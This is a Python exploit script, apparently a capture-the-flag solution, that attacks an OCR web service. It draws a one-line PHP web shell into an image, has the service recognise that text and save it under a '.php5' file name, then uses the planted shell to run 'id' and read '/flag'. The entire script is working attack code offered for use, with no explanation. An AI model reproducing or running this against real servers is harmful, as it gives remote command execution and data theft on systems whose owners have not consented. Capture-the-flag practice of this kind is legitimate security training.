import re, io, base64, requests
from PIL import Image, ImageDraw, ImageFont

BASE = "http://59baf0d6-152e-4889-b892-059c747d171d.51.79.140.18.nip.io:8080/"
S = requests.Session()
FONT = "C:/Windows/Fonts/arial.ttf"

def png(text):
    img = Image.new("RGB", (1000, 160), "white")
    ImageDraw.Draw(img).text((10, 30), text, fill="black",
                             font=ImageFont.truetype(FONT, 70))
    b = io.BytesIO(); img.save(b, "PNG")
    return "data:image/png;base64," + base64.b64encode(b.getvalue()).decode()

def ocr(text):
    r = S.post(BASE + "/", data={"image_data": png(text)}, timeout=60)
    m = re.search(r'name="ocr_id" value="([0-9a-f]+)"', r.text)
    assert m, "OCR failed"
    return m.group(1)

def save(oid, filename):
    r = S.post(BASE + "/", data={"save_output": "1", "ocr_id": oid,
                                 "filename": filename}, timeout=60)
    return re.search(r'notice[^>]*>(.*?)</p>', r.text, re.S).group(1).strip()

def sh(cmd):
    return requests.get(BASE + "/saved/s.php5", params={"0": cmd}, timeout=60).text

def main():
    print("[*] target", BASE)
    msg = save(ocr("<?PHP SYSTEM($_GET[0]);?>"), "s.php5")
    print("[+] deploy:", msg)
    assert "Saved" in msg, msg
    print("[+] whoami:", sh("id").strip())
    flag = sh("cat /flag").strip()
    print("[FLAG]", flag)


if __name__ == "__main__":
    main()
